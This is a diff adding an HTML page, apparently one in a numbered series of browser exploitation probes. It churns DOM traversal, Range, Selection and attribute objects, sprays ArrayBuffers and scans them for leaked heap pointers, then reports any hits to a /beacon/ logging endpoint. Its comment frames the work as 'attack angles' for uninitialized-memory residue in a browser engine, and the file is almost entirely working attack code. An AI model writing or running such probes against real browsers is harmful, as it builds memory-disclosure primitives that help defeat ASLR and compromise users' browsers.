@@ -1,0 +1,401 @@
+<!--
+  p774: DOM TreeWalker / NodeIterator / Range internal buffer residue oracle
+
+  TreeWalker and NodeIterator are DOM traversal objects backed by C++
+  NodeIteratorBase. They hold a reference to the root node and maintain
+  internal traversal state (current node pointer, filter callback ref).
+  When GC'd, these C++ backing objects are freed.
+
+  Key insight: NodeIterator registers itself with the Document to receive
+  notifications when nodes are removed (nodeWillBeRemoved). This
+  registration allocates entries in the Document's NodeIterator list.
+  Creating many NodeIterators and then letting them be GC'd frees those
+  registration entries and the backing C++ objects.
+
+  Range objects (document.createRange(), Selection.getRangeAt()) hold
+  start/end container+offset pairs and register with the Document for
+  mutation notifications. The Range backing object contains direct
+  pointers to DOM nodes. Creating/collapsing/detaching many Ranges
+  exercises a different allocator path.
+
+  Additionally: document.createNodeIterator with a custom NodeFilter
+  callback creates a C++ FilteredNodeIterator that wraps a JS callback.
+  The C++ wrapper holds pointers to both the JS callback and the
+  internal iteration state.
+
+  Selection API (window.getSelection()) maintains internal Range
+  objects. Programmatically modifying selections exercises the
+  Selection's internal state management.
+
+  Attack angles:
+  A) Bulk NodeIterator create/traverse/GC then AB spray.
+  B) Range create/collapse/detach churn then spray.
+  C) NodeIterator with custom NodeFilter callback residue.
+  D) Selection API internal Range manipulation.
+  E) TreeWalker deep traversal with DOM mutation during walk.
+  F) DOMTokenList (classList) / NamedNodeMap (attributes) backing store.
+
+  CRASH_CLASS: LOW (DOM traversal/range/selection, no side effects)
+  prior art: p773 (CSS style residue), p633 (DOM stale pointers dead)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p774</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+window.onload=function(){
+b('p774-START');
+
+// === Section A: Bulk NodeIterator create/traverse/GC then spray ===
+try{
+  b('A-nodeiterator-residue');
+  var aHits=0;
+
+  var tree=document.createElement('div');
+  for(var i=0;i<100;i++){
+    var child=document.createElement('span');
+    child.textContent='node_'+i;
+    for(var j=0;j<3;j++){
+      var grandchild=document.createElement('em');
+      grandchild.textContent='gc_'+i+'_'+j;
+      child.appendChild(grandchild);
+    }
+    tree.appendChild(child);
+  }
+  document.body.appendChild(tree);
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var iterators=[];
+      for(var i=0;i<200;i++){
+        var ni=document.createNodeIterator(tree, NodeFilter.SHOW_ALL);
+        var count=0;
+        var node;
+        while((node=ni.nextNode())!==null){count++;}
+        iterators.push(ni);
+      }
+      if(round===0)b('A traversed nodes per iterator='+200);
+      iterators=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[48,64,96,128];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('A-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      aHits+=szHits;
+    }
+  }
+  document.body.removeChild(tree);
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: Range create/collapse/detach churn ===
+try{
+  b('B-range-churn');
+  var bHits=0;
+
+  var container=document.createElement('div');
+  for(var i=0;i<50;i++){
+    var p=document.createElement('p');
+    p.textContent='Paragraph number '+i+' with some text content for range selection testing purposes.';
+    container.appendChild(p);
+  }
+  document.body.appendChild(container);
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var ranges=[];
+      for(var i=0;i<300;i++){
+        var range=document.createRange();
+        var startNode=container.children[i%50];
+        var endNode=container.children[(i+1)%50];
+        try{
+          range.setStart(startNode.firstChild,0);
+          range.setEnd(endNode.firstChild, Math.min(10,endNode.firstChild.length));
+        }catch(e){}
+        ranges.push(range);
+      }
+
+      for(var i=0;i<ranges.length;i++){
+        try{
+          ranges[i].collapse(i%2===0);
+          ranges[i].detach();
+        }catch(e){}
+      }
+      ranges=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(96);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=96;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('B-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    bHits+=szHits;
+  }
+  document.body.removeChild(container);
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: NodeIterator with custom NodeFilter callback ===
+try{
+  b('C-custom-filter');
+  var cHits=0;
+
+  var filterTree=document.createElement('div');
+  for(var i=0;i<80;i++){
+    var el=document.createElement('div');
+    el.className=(i%3===0?'target':'other');
+    el.setAttribute('data-idx',String(i));
+    el.textContent='filtered_'+i;
+    for(var j=0;j<2;j++){
+      var sub=document.createElement('span');
+      sub.className=(j===0?'target':'other');
+      sub.textContent='sub_'+i+'_'+j;
+      el.appendChild(sub);
+    }
+    filterTree.appendChild(el);
+  }
+  document.body.appendChild(filterTree);
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var iters=[];
+      for(var i=0;i<100;i++){
+        var filterCallCount=0;
+        var filter={
+          acceptNode:function(node){
+            filterCallCount++;
+            if(node.className==='target')return NodeFilter.FILTER_ACCEPT;
+            if(node.nodeName==='SPAN')return NodeFilter.FILTER_SKIP;
+            return NodeFilter.FILTER_REJECT;
+          }
+        };
+        var ni=document.createNodeIterator(filterTree, NodeFilter.SHOW_ELEMENT, filter);
+        var accepted=0;
+        while(ni.nextNode()!==null)accepted++;
+        iters.push({iter:ni,accepted:accepted,calls:filterCallCount});
+      }
+      if(round===0)b('C filter accepted='+iters[0].accepted+' calls='+iters[0].calls);
+      iters=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(128);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=128;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('C-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    cHits+=szHits;
+  }
+  document.body.removeChild(filterTree);
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: Selection API internal Range manipulation ===
+try{
+  b('D-selection');
+  var dHits=0;
+
+  var selContainer=document.createElement('div');
+  for(var i=0;i<30;i++){
+    var p=document.createElement('p');
+    p.textContent='Selection test paragraph '+i+' with enough text for range endpoints.';
+    selContainer.appendChild(p);
+  }
+  document.body.appendChild(selContainer);
+
+  var sel=window.getSelection();
+  if(!sel){
+    b('D-SKIP no getSelection');
+  }else{
+    for(var round=0;round<5;round++){
+      for(var i=0;i<100;i++){
+        try{
+          sel.removeAllRanges();
+          var r=document.createRange();
+          var startP=selContainer.children[i%30];
+          var endP=selContainer.children[(i+5)%30];
+          r.setStart(startP.firstChild,0);
+          r.setEnd(endP.firstChild,Math.min(15,endP.firstChild.length));
+          sel.addRange(r);
+
+          if(i%10===0){
+            sel.collapseToStart();
+            sel.extend(endP.firstChild,Math.min(10,endP.firstChild.length));
+          }
+        }catch(e){}
+      }
+      sel.removeAllRanges();
+
+      if(round===0)b('D selection_type='+sel.type+' rangeCount='+sel.rangeCount);
+
+      for(var i=0;i<2000;i++){var tmp=new ArrayBuffer(64);}
+
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(96);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=96;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('D-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      dHits+=szHits;
+    }
+  }
+  document.body.removeChild(selContainer);
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: TreeWalker deep traversal with DOM mutation ===
+try{
+  b('E-treewalker-mutation');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    var root=document.createElement('div');
+    function buildTree(parent,depth){
+      if(depth<=0)return;
+      for(var i=0;i<4;i++){
+        var child=document.createElement('div');
+        child.textContent='d'+depth+'_n'+i;
+        child.setAttribute('data-depth',String(depth));
+        parent.appendChild(child);
+        buildTree(child,depth-1);
+      }
+    }
+    buildTree(root,4);
+    document.body.appendChild(root);
+
+    var tw=document.createTreeWalker(root,NodeFilter.SHOW_ELEMENT);
+    var visited=0;
+    var removed=0;
+    while(tw.nextNode()){
+      visited++;
+      if(visited%10===0 && tw.currentNode.parentNode){
+        try{
+          var toRemove=tw.currentNode;
+          tw.previousNode();
+          toRemove.parentNode.removeChild(toRemove);
+          removed++;
+        }catch(e){}
+      }
+    }
+    if(round===0)b('E visited='+visited+' removed='+removed);
+
+    document.body.removeChild(root);
+    root=null;
+
+    for(var i=0;i<2000;i++){var tmp=new ArrayBuffer(96);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(128);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=128;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('E-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    eHits+=szHits;
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: DOMTokenList / NamedNodeMap backing store ===
+try{
+  b('F-tokenlist-nodemap');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    var container=document.createElement('div');
+    document.body.appendChild(container);
+
+    for(var i=0;i<100;i++){
+      var el=document.createElement('div');
+      for(var j=0;j<20;j++){
+        el.classList.add('class-'+round+'-'+i+'-'+j);
+      }
+      for(var j=0;j<15;j++){
+        el.setAttribute('data-attr-'+j+'-'+round, 'value_'+i+'_'+j+'_'+'z'.repeat(20));
+      }
+      container.appendChild(el);
+    }
+
+    void container.offsetHeight;
+
+    if(round===0){
+      var first=container.children[0];
+      b('F classList.length='+first.classList.length+' attributes.length='+first.attributes.length);
+    }
+
+    document.body.removeChild(container);
+    container=null;
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[48,64,96,128];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('F-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      fHits+=szHits;
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p774-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
